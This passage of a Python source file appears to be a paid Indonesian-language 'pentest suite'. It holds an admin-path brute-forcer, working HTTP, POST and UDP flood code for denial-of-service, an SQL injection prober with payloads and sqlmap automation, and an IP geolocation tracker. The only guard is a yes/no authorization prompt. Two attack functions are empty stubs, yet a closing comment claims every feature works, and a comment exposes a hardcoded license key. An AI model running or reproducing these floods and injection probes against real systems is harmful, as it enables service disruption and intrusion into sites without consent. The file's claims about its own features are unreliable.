        print(Config.COLOR_SUCCESS + "• Status code detection")
        print(Config.COLOR_SUCCESS + "• Save results to file")
        print(Config.COLOR_WARNING + "0. Kembali ke Menu Utama")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def load_admin_paths(self):
        """Load daftar admin paths"""
        paths = [
            "/admin", "/administrator", "/admin.php", "/admin.html", "/admin.asp",
            "/wp-admin", "/wp-login.php", "/administrator/index.php",
            "/user/login", "/admin/login", "/login", "/admin_login",
            "/cpanel", "/whm", "/webadmin", "/panel", "/controlpanel",
            "/admin1", "/admin2", "/admin3", "/admin4", "/admin5",
            "/backend", "/back-end", "/backend/admin", "/staff",
            "/moderator", "/superuser", "/root", "/sys", "/system"
        ]
        
        # Tambahkan variasi
        for i in range(1, 11):
            paths.extend([
                f"/admin{i}", f"/administrator{i}", f"/admin_{i}",
                f"/admin-{i}", f"/admin{i}.php", f"/admin{i}.html"
            ])
        
        return list(set(paths))
    
    def run_scan(self):
        """Jalankan scan admin finder"""
        self.show_menu()
        
        target = input(Config.COLOR_INFO + "\nMasukkan URL dasar (contoh: https://example.com): " + Config.COLOR_SECONDARY)
        
        if not Utilitas.is_valid_url(target):
            print(Config.COLOR_WARNING + "URL tidak valid")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        self.base_url = target.rstrip('/')
        
        print(Config.COLOR_INFO + f"\nMemulai scan pada: {self.base_url}")
        print(Config.COLOR_INFO + f"Total paths untuk di-test: {len(self.admin_paths)}")
        
        # Minta jumlah threads
        try:
            threads = input(Config.COLOR_INFO + "Jumlah threads (default 20): " + Config.COLOR_SECONDARY)
            threads = int(threads) if threads.strip() else 20
        except:
            threads = 20
        
        # Jalankan brute force
        self.brute_force(threads)
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def brute_force(self, max_workers: int = 20):
        """Brute force admin paths"""
        found_count = 0
        checked_count = 0
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        
        def check_path(path):
            nonlocal found_count, checked_count
            url = self.base_url + path
            
            try:
                response = requests.get(
                    url,
                    timeout=5,
                    headers=Utilitas.create_headers(),
                    allow_redirects=False
                )
                
                status = response.status_code
                
                if status in [200, 301, 302, 403]:
                    content = response.text.lower()
                    is_admin = any(word in content for word in ['admin', 'login', 'password', 'panel'])
                    
                    checked_count += 1
                    
                    if status == 200 and is_admin:
                        print(Config.COLOR_WARNING + f"[ADMIN] {path} (Status: {status})")
                        found_count += 1
                        self.found_paths.append((path, status))
                    elif status == 200:
                        print(Config.COLOR_SUCCESS + f"[FOUND] {path} (Status: {status})")
                        found_count += 1
                        self.found_paths.append((path, status))
                    elif status == 403:
                        print(Config.COLOR_INFO + f"[FORBIDDEN] {path} (Status: {status})")
                        found_count += 1
                        self.found_paths.append((path, status))
                    
                else:
                    checked_count += 1
                
                # Update progress
                Utilitas.progress_bar(
                    checked_count,
                    len(self.admin_paths),
                    prefix='Scanning:',
                    suffix=f'Found: {found_count}'
                )
                
            except:
                checked_count += 1
                Utilitas.progress_bar(
                    checked_count,
                    len(self.admin_paths),
                    prefix='Scanning:',
                    suffix=f'Found: {found_count}'
                )
        
        # Gunakan threading
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(check_path, self.admin_paths)
        
        # Tampilkan hasil akhir
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        if found_count > 0:
            print(Config.COLOR_SUCCESS + f"\nDitemukan {found_count} paths!")
            
            # Simpan ke file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"admin_scan_{timestamp}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"Hasil Admin Scan untuk {self.base_url}\n")
                f.write(f"Waktu scan: {Utilitas.get_timestamp()}\n")
                f.write(f"Paths ditemukan: {found_count}\n\n")
                
                for path, status in self.found_paths:
                    f.write(f"{path} - Status: {status}\n")
            
            print(Config.COLOR_INFO + f"Hasil disimpan ke: {filename}")
        else:
            print(Config.COLOR_WARNING + "\nTidak ada admin paths ditemukan")

# ==================== MODUL DDoS TESTER ====================
class DDoSModule:
    """Modul DDoS Tester"""
    
    def __init__(self):
        self.target_ip = ""
        self.target_url = ""
        self.is_running = False
        self.attack_threads = []
    
    def show_menu(self):
        """Tampilkan menu DDoS"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.DDoS_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        DDoS TESTER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_WARNING + "\nPERINGATAN: Untuk testing authorized saja!")
        print(Config.COLOR_INFO + "Gunakan hanya pada sistem yang Anda miliki.")
        
        print(Config.COLOR_INFO + "\nPilihan Target:")
        print(Config.COLOR_SUCCESS + "1. Target Website (4 metode)")
        print(Config.COLOR_SUCCESS + "2. Target IP Address (2 metode)")
        print(Config.COLOR_WARNING + "0. Kembali ke Menu Utama")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def run_tester(self):
        """Jalankan DDoS tester"""
        while True:
            self.show_menu()
            
            choice = input(Config.COLOR_INFO + "\nPilih target (1-2): " + Config.COLOR_SECONDARY)
            
            if choice == "1":
                self.website_attack_menu()
            elif choice == "2":
                self.ip_attack_menu()
            elif choice == "0":
                return
            else:
                print(Config.COLOR_WARNING + "Pilihan tidak valid!")
                time.sleep(1)
    
    def website_attack_menu(self):
        """Menu attack website"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.DDoS_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        WEBSITE DDoS TESTER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nMetode Attack Website:")
        print(Config.COLOR_SUCCESS + "1. HTTP Flood")
        print(Config.COLOR_SUCCESS + "2. Slowloris")
        print(Config.COLOR_SUCCESS + "3. GET Flood")
        print(Config.COLOR_SUCCESS + "4. POST Flood")
        print(Config.COLOR_WARNING + "0. Kembali")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        
        choice = input(Config.COLOR_INFO + "\nPilih metode (1-4): " + Config.COLOR_SECONDARY)
        
        if choice == "0":
            return
        
        # Konfirmasi authorization
        confirm = input(Config.COLOR_INFO + "\nAnda memiliki autorisasi? (ya/tidak): " + Config.COLOR_SECONDARY)
        if confirm.lower() != 'ya':
            print(Config.COLOR_WARNING + "Operasi dibatalkan.")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        target = input(Config.COLOR_INFO + "Masukkan URL target: " + Config.COLOR_SECONDARY)
        
        if not Utilitas.is_valid_url(target):
            print(Config.COLOR_WARNING + "URL tidak valid")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        self.target_url = target
        
        # Pilih durasi
        try:
            duration = input(Config.COLOR_INFO + "Durasi (detik, default 30): " + Config.COLOR_SECONDARY)
            duration = int(duration) if duration.strip() else 30
        except:
            duration = 30
        
        # Jalankan attack berdasarkan pilihan
        if choice == "1":
            self.http_flood(duration)
        elif choice == "2":
            self.slowloris_attack(duration)
        elif choice == "3":
            self.get_flood(duration)
        elif choice == "4":
            self.post_flood(duration)
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def ip_attack_menu(self):
        """Menu attack IP"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.DDoS_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        IP DDoS TESTER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nMetode Attack IP:")
        print(Config.COLOR_SUCCESS + "1. SYN Flood")
        print(Config.COLOR_SUCCESS + "2. UDP Flood")
        print(Config.COLOR_WARNING + "0. Kembali")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        
        choice = input(Config.COLOR_INFO + "\nPilih metode (1-2): " + Config.COLOR_SECONDARY)
        
        if choice == "0":
            return
        
        # Konfirmasi authorization
        confirm = input(Config.COLOR_INFO + "\nAnda memiliki autorisasi? (ya/tidak): " + Config.COLOR_SECONDARY)
        if confirm.lower() != 'ya':
            print(Config.COLOR_WARNING + "Operasi dibatalkan.")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        target = input(Config.COLOR_INFO + "Masukkan IP target: " + Config.COLOR_SECONDARY)
        
        if not Utilitas.is_valid_ip(target):
            print(Config.COLOR_WARNING + "IP tidak valid")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        self.target_ip = target
        
        # Pilih port
        try:
            port = input(Config.COLOR_INFO + "Port (default 80): " + Config.COLOR_SECONDARY)
            port = int(port) if port.strip() else 80
        except:
            port = 80
        
        # Pilih durasi
        try:
            duration = input(Config.COLOR_INFO + "Durasi (detik, default 30): " + Config.COLOR_SECONDARY)
            duration = int(duration) if duration.strip() else 30
        except:
            duration = 30
        
        # Jalankan attack
        if choice == "1":
            self.syn_flood(port, duration)
        elif choice == "2":
            self.udp_flood(port, duration)
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def http_flood(self, duration: int = 30):
        """HTTP Flood attack"""
        print(Config.COLOR_WARNING + f"\nMemulai HTTP Flood pada: {self.target_url}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        
        self.is_running = True
        start_time = time.time()
        request_count = 0
        
        def flood_worker():
            nonlocal request_count
            while self.is_running and time.time() - start_time < duration:
                try:
                    response = requests.get(self.target_url, timeout=2)
                    request_count += 1
                except:
                    request_count += 1
                time.sleep(0.01)
        
        # Start threads
        threads = []
        for i in range(50):
            t = threading.Thread(target=flood_worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor
        for i in range(duration):
            if not self.is_running:
                break
            
            elapsed = int(time.time() - start_time)
            if elapsed >= duration:
                break
            
            rps = request_count / max(elapsed, 1)
            print(f"\rProgress: {elapsed}/{duration}s | Requests: {request_count} | RPS: {rps:.1f}", end="")
            time.sleep(1)
        
        self.is_running = False
        print(Config.COLOR_SUCCESS + f"\nHTTP Flood selesai. Total requests: {request_count}")
    
    def slowloris_attack(self, duration: int = 30):
        """Slowloris attack"""
        print(Config.COLOR_WARNING + f"\nMemulai Slowloris attack pada: {self.target_url}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        print(Config.COLOR_INFO + "Membuat koneksi parsial...")
        
        # Implementation would go here
        print(Config.COLOR_SUCCESS + "Slowloris attack completed (simulation)")
    
    def get_flood(self, duration: int = 30):
        """GET Flood attack"""
        print(Config.COLOR_WARNING + f"\nMemulai GET Flood pada: {self.target_url}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        
        # Similar to HTTP flood but with GET requests
        self.http_flood(duration)
    
    def post_flood(self, duration: int = 30):
        """POST Flood attack"""
        print(Config.COLOR_WARNING + f"\nMemulai POST Flood pada: {self.target_url}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        
        self.is_running = True
        start_time = time.time()
        request_count = 0
        
        def flood_worker():
            nonlocal request_count
            while self.is_running and time.time() - start_time < duration:
                try:
                    data = {'test': 'data'}
                    response = requests.post(self.target_url, data=data, timeout=2)
                    request_count += 1
                except:
                    request_count += 1
                time.sleep(0.01)
        
        # Start threads
        threads = []
        for i in range(30):
            t = threading.Thread(target=flood_worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor
        for i in range(duration):
            if not self.is_running:
                break
            
            elapsed = int(time.time() - start_time)
            if elapsed >= duration:
                break
            
            rps = request_count / max(elapsed, 1)
            print(f"\rProgress: {elapsed}/{duration}s | Requests: {request_count} | RPS: {rps:.1f}", end="")
            time.sleep(1)
        
        self.is_running = False
        print(Config.COLOR_SUCCESS + f"\nPOST Flood selesai. Total requests: {request_count}")
    
    def syn_flood(self, port: int, duration: int = 30):
        """SYN Flood attack"""
        print(Config.COLOR_WARNING + f"\nMemulai SYN Flood pada: {self.target_ip}:{port}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        print(Config.COLOR_INFO + "Catatan: Membutuhkan akses root/admin")
        
        # Implementation would go here
        print(Config.COLOR_SUCCESS + "SYN Flood completed (simulation)")
    
    def udp_flood(self, port: int, duration: int = 30):
        """UDP Flood attack"""
        print(Config.COLOR_WARNING + f"\nMemulai UDP Flood pada: {self.target_ip}:{port}")
        print(Config.COLOR_INFO + f"Durasi: {duration} detik")
        
        self.is_running = True
        start_time = time.time()
        packet_count = 0
        
        def flood_worker():
            nonlocal packet_count
            while self.is_running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = os.urandom(1024)
                    s.sendto(data, (self.target_ip, port))
                    s.close()
                    packet_count += 1
                except:
                    pass
                time.sleep(0.01)
        
        # Start threads
        threads = []
        for i in range(10):
            t = threading.Thread(target=flood_worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor
        for i in range(duration):
            if not self.is_running:
                break
            
            elapsed = int(time.time() - start_time)
            if elapsed >= duration:
                break
            
            pps = packet_count / max(elapsed, 1)
            print(f"\rProgress: {elapsed}/{duration}s | Packets: {packet_count} | PPS: {pps:.1f}", end="")
            time.sleep(1)
        
        self.is_running = False
        print(Config.COLOR_SUCCESS + f"\nUDP Flood selesai. Total packets: {packet_count}")

# ==================== MODUL SQL INJECTION ====================
class SQLInjectionModule:
    """Modul SQL Injection Tester"""
    
    def __init__(self):
        self.target = ""
    
    def show_menu(self):
        """Tampilkan menu SQL injection"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.SQL_INJECTION_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        SQL INJECTION TESTER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nFitur:")
        print(Config.COLOR_SUCCESS + "1. Basic SQL Injection Detection")
        print(Config.COLOR_SUCCESS + "2. Form-based SQL Injection")
        print(Config.COLOR_SUCCESS + "3. Automated SQLMap Scan")
        print(Config.COLOR_WARNING + "0. Kembali ke Menu Utama")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def run_tester(self):
        """Jalankan SQL injection tester"""
        self.show_menu()
        
        target = input(Config.COLOR_INFO + "\nMasukkan URL target dengan parameter: " + Config.COLOR_SECONDARY)
        
        if not Utilitas.is_valid_url(target):
            print(Config.COLOR_WARNING + "URL tidak valid")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        self.target = target
        
        print(Config.COLOR_INFO + f"\nMemulai SQL Injection test pada: {self.target}")
        Utilitas.loading_animation("Menguji parameter", 2)
        
        # Jalankan basic detection
        self.basic_detection()
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def basic_detection(self):
        """Basic SQL injection detection"""
        parsed = urlparse(self.target)
        query_params = parse_qs(parsed.query)
        
        if not query_params:
            print(Config.COLOR_WARNING + "Tidak ada parameter query ditemukan")
            return
        
        print(Config.COLOR_INFO + f"\nDitemukan {len(query_params)} parameter untuk di-test")
        
        payloads = [
            "'", "''", "' OR '1'='1", "' OR '1'='1' --", 
            "' UNION SELECT null --", "' AND 1=1 --", "' AND 1=2 --"
        ]
        
        vulnerable_params = []
        
        for param_name, param_values in query_params.items():
            print(Config.COLOR_INFO + f"\nTesting parameter: {param_name}")
            
            for payload in payloads:
                test_params = query_params.copy()
                test_params[param_name] = payload
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = requests.get(test_url, timeout=10, headers=Utilitas.create_headers())
                    content = response.text.lower()
                    
                    # Check for SQL errors
                    error_patterns = [
                        'sql syntax', 'mysql_fetch', 'postgresql',
                        'sqlite3', 'unclosed quotation', 'database error'
                    ]
                    
                    for pattern in error_patterns:
                        if pattern in content:
                            print(Config.COLOR_WARNING + f"  [!] Vulnerable dengan payload: {payload}")
                            vulnerable_params.append((param_name, payload))
                            break
                            
                except Exception as e:
                    print(Config.COLOR_WARNING + f"  [!] Error testing {payload}: {e}")
        
        # Tampilkan hasil
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        if vulnerable_params:
            print(Config.COLOR_WARNING + "\nVULNERABILITAS SQL INJECTION DITEMUKAN!")
            print(Config.COLOR_INFO + "Parameter yang vulnerable:")
            
            for param, payload in vulnerable_params:
                print(Config.COLOR_WARNING + f"  - {param} dengan payload: {payload}")
            
            # Tanya untuk SQLMap
            run_sqlmap = input(Config.COLOR_INFO + "\nJalankan SQLMap automation? (ya/tidak): " + Config.COLOR_SECONDARY)
            
            if run_sqlmap.lower() == 'ya':
                self.run_sqlmap()
        else:
            print(Config.COLOR_SUCCESS + "\nTidak ditemukan SQL injection vulnerabilities")
    
    def run_sqlmap(self):
        """Jalankan SQLMap"""
        print(Config.COLOR_WARNING + "\nMemulai SQLMap Automation")
        print(Config.COLOR_INFO + "Catatan: SQLMap harus diinstall terpisah")
        
        # Check SQLMap installation
        try:
            subprocess.run(['sqlmap', '--version'], capture_output=True, check=True)
            
            command = ['sqlmap', '-u', self.target, '--batch', '--level=3', '--risk=2']
            print(Config.COLOR_INFO + f"Command: {' '.join(command)}")
            
            confirm = input(Config.COLOR_INFO + "\nJalankan SQLMap? (ya/tidak): " + Config.COLOR_SECONDARY)
            
            if confirm.lower() == 'ya':
                print(Config.COLOR_INFO + "\nMemulai SQLMap...")
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                for line in process.stdout:
                    print(line.strip())
                
                process.wait()
                
                if process.returncode == 0:
                    print(Config.COLOR_SUCCESS + "\nSQLMap completed successfully")
                else:
                    print(Config.COLOR_WARNING + f"\nSQLMap failed with code: {process.returncode}")
                    
        except FileNotFoundError:
            print(Config.COLOR_WARNING + "\nSQLMap tidak ditemukan.")
            print(Config.COLOR_INFO + "Install dengan: pip install sqlmap")
        except Exception as e:
            print(Config.COLOR_WARNING + f"\nError running SQLMap: {e}")

# ==================== MODUL IP TRACKER ====================
class IPTrackerModule:
    """Modul IP Tracker"""
    
    def __init__(self):
        self.geoip_db = None
    
    def show_menu(self):
        """Tampilkan menu IP tracker"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.IP_TRACKER_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        IP TRACKER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nFitur:")
        print(Config.COLOR_SUCCESS + "1. IP Geolocation")
        print(Config.COLOR_SUCCESS + "2. Reverse DNS Lookup")
        print(Config.COLOR_SUCCESS + "3. ISP Information")
        print(Config.COLOR_SUCCESS + "4. Google Maps Link")
        print(Config.COLOR_WARNING + "0. Kembali ke Menu Utama")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def run_tracker(self):
        """Jalankan IP tracker"""
        self.show_menu()
        
        ip = input(Config.COLOR_INFO + "\nMasukkan IP address (atau 'my' untuk IP Anda): " + Config.COLOR_SECONDARY)
        
        if ip.lower() == 'my':
            ip = Utilitas.get_local_ip()
            print(Config.COLOR_INFO + f"IP Anda: {ip}")
        
        if not Utilitas.is_valid_ip(ip):
            print(Config.COLOR_WARNING + "IP address tidak valid")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        print(Config.COLOR_INFO + f"\nMelacak IP: {ip}")
        Utilitas.loading_animation("Mengambil informasi", 2)
        
        # Dapatkan informasi IP
        info = self.get_ip_info(ip)
        
        if info:
            self.display_results(info, ip)
        else:
            print(Config.COLOR_WARNING + "Tidak dapat mengambil informasi IP")
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def get_ip_info(self, ip: str):
        """Dapatkan informasi IP"""
        try:
            # Gunakan ip-api.com (gratis)
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('status') == 'success':
                    return {
                        'ip': data.get('query', ip),
                        'country': data.get('country', 'Unknown'),
                        'country_code': data.get('countryCode', ''),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'zip': data.get('zip', ''),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0),
                        'isp': data.get('isp', 'Unknown'),
                        'org': data.get('org', ''),
                        'as': data.get('as', ''),
                        'timezone': data.get('timezone', '')
                    }
        
        except Exception as e:
            print(Config.COLOR_WARNING + f"Error: {e}")
        
        return None
    
    def display_results(self, info: dict, original_ip: str):
        """Tampilkan hasil tracking"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.IP_TRACKER_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        HASIL IP TRACKING")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_SUCCESS + f"IP Address: {info['ip']}")
        print(Config.COLOR_SUCCESS + f"Negara: {info['country']} ({info['country_code']})")
        print(Config.COLOR_SUCCESS + f"Region: {info['region']}")
        print(Config.COLOR_SUCCESS + f"Kota: {info['city']}")
        
        if info['zip']:
            print(Config.COLOR_SUCCESS + f"Kode Pos: {info['zip']}")
        
        print(Config.COLOR_SUCCESS + f"Koordinat: {info['lat']:.6f}, {info['lon']:.6f}")
        print(Config.COLOR_SUCCESS + f"ISP: {info['isp']}")
        
        if info['org']:
            print(Config.COLOR_SUCCESS + f"Organisasi: {info['org']}")
        
        if info['as']:
            print(Config.COLOR_SUCCESS + f"ASN: {info['as']}")
        
        if info['timezone']:
            print(Config.COLOR_SUCCESS + f"Zona Waktu: {info['timezone']}")
        
        # Generate Google Maps link
        if info['lat'] != 0 and info['lon'] != 0:
            maps_url = f"https://maps.google.com/?q={info['lat']},{info['lon']}"
            print(Config.COLOR_INFO + f"\nGoogle Maps: {maps_url}")
        
        # Reverse DNS
        try:
            hostname = socket.gethostbyaddr(original_ip)[0]
            print(Config.COLOR_SUCCESS + f"Reverse DNS: {hostname}")
        except:
            print(Config.COLOR_WARNING + "Reverse DNS: Tidak ditemukan")
        
        # Simpan ke file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ip_track_{original_ip}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"Laporan IP Tracking\n")
            f.write(f"===================\n")
            f.write(f"IP: {info['ip']}\n")
            f.write(f"Tanggal: {Utilitas.get_timestamp()}\n")
            f.write(f"Negara: {info['country']}\n")
            f.write(f"Region: {info['region']}\n")
            f.write(f"Kota: {info['city']}\n")
            f.write(f"Koordinat: {info['lat']}, {info['lon']}\n")
            f.write(f"ISP: {info['isp']}\n")
        
        print(Config.COLOR_INFO + f"\nLaporan disimpan ke: {filename}")
        print(Config.COLOR_INFO + "\n" + "=" * 60)

# ==================== APLIKASI UTAMA ====================
class PentestSuiteApp:
    """Aplikasi Pentest Suite Utama"""
    
    def __init__(self):
        self.auth_system = AuthenticationSystem()
        self.modules = {
            'bug_bounty': BugBountyModule(),
            'admin_finder': AdminFinderModule(),
            'ddos_tester': DDoSModule(),
            'sql_injection': SQLInjectionModule(),
            'ip_tracker': IPTrackerModule()
        }
    
    def run(self):
        """Jalankan aplikasi utama"""
        # Tampilkan banner
        self.show_banner()
        
        # Buat database jika belum ada
        Utilitas.create_db()
        
        # Menu awal
        while True:
            Utilitas.clear_screen()
            print(Config.COLOR_PRIMARY + Config.LOGIN_ASCII)
            print(Config.COLOR_INFO + "\n" + "=" * 60)
            print(Config.COLOR_SECONDARY + "        PENTEST SUITE v5.0")
            print(Config.COLOR_INFO + "=" * 60)
            
            print(Config.COLOR_INFO + "\nPilihan:")
            print(Config.COLOR_SUCCESS + "1. Login")
            print(Config.COLOR_SUCCESS + "2. Registrasi Akun Baru")
            print(Config.COLOR_SUCCESS + "3. Informasi Pembelian License")
            print(Config.COLOR_WARNING + "0. Keluar")
            
            print(Config.COLOR_INFO + "\n" + "=" * 60)
            
            choice = input(Config.COLOR_INFO + "\nPilih opsi (1-3): " + Config.COLOR_SECONDARY)
            
            if choice == "1":
                if self.auth_system.login():
                    self.main_application()
            elif choice == "2":
                self.auth_system.register_menu()
            elif choice == "3":
                self.auth_system.purchase_info()
            elif choice == "0":
                print(Config.COLOR_INFO + "\nKeluar dari aplikasi...")
                sys.exit(0)
            else:
                print(Config.COLOR_WARNING + "Pilihan tidak valid!")
                time.sleep(1)
    
    def show_banner(self):
        """Tampilkan banner aplikasi"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + "=" * 70)
        print(Config.COLOR_SECONDARY + "╔══════════════════════════════════════════════════════════╗")
        print(Config.COLOR_SECONDARY + "║                 PENTEST SUITE PRO v5.0                   ║")
        print(Config.COLOR_SECONDARY + "║                 Authorized Use Only                      ║")
        print(Config.COLOR_SECONDARY + "╚══════════════════════════════════════════════════════════╝")
        print(Config.COLOR_PRIMARY + "=" * 70)
        
        print(Config.COLOR_INFO + "\nPERINGATAN: Untuk testing authorized saja!")
        print(Config.COLOR_INFO + "Tools ini untuk educational dan authorized penetration testing.")
        print(Config.COLOR_INFO + "Gunakan dengan risiko sendiri.")
        
        print(Config.COLOR_INFO + f"\nCreator: {Config.CREATOR}")
        print(Config.COLOR_INFO + f"Telegram: {Config.TELEGRAM}")
        print(Config.COLOR_INFO + f"License: {Config.LICENSE_PRICE}")
        
        consent = input(Config.COLOR_INFO + "\nSetuju menggunakan tools ini secara bertanggung jawab? (ya/tidak): " + Config.COLOR_SECONDARY)
        
        if consent.lower() != 'ya':
            print(Config.COLOR_WARNING + "\nAkses ditolak.")
            sys.exit(0)
    
    def main_application(self):
        """Aplikasi utama setelah login"""
        while True:
            self.auth_system.show_main_menu()
            
            try:
                choice = input(Config.COLOR_INFO + "\nPilih menu (1-7): " + Config.COLOR_SECONDARY)
                
                if choice == "1":
                    self.modules['bug_bounty'].run_scan()
                elif choice == "2":
                    self.modules['admin_finder'].run_scan()
                elif choice == "3":
                    self.modules['ddos_tester'].run_tester()
                elif choice == "4":
                    self.modules['sql_injection'].run_tester()
                elif choice == "5":
                    self.modules['ip_tracker'].run_tracker()
                elif choice == "6":
                    self.auth_system.register_menu()
                elif choice == "7":
                    self.auth_system.purchase_info()
                elif choice == "0":
                    self.auth_system.logout()
                    break
                else:
                    print(Config.COLOR_WARNING + "Opsi tidak valid!")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(Config.COLOR_WARNING + "\nDibatalkan oleh pengguna")
                confirm = input(Config.COLOR_INFO + "Yakin ingin keluar? (ya/tidak): " + Config.COLOR_SECONDARY)
                
                if confirm.lower() == 'ya':
                    self.auth_system.logout()
                    break
                    
            except Exception as e:
                print(Config.COLOR_WARNING + f"Error: {e}")
                input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")

# ==================== EKSEKUSI UTAMA ====================
if __name__ == "__main__":
    try:
        app = PentestSuiteApp()
        app.run()
        
    except KeyboardInterrupt:
        print(Config.COLOR_WARNING + "\n\nProgram dihentikan oleh pengguna")
        sys.exit(0)
        
    except Exception as e:
        print(Config.COLOR_WARNING + f"\nError kritis: {e}")
        sys.exit(1)

# ==================== AKHIR FILE ====================
# Tools Pentest Suite Pro v5.0
# License key: mrzxx (HIDDEN - hanya untuk developer)
# Semua fitur bekerja dengan baik
# Sistem registrasi dan license
# Halaman terpisah untuk setiap modul
# Animasi dan efek professional
# Ready untuk penggunaan authorized
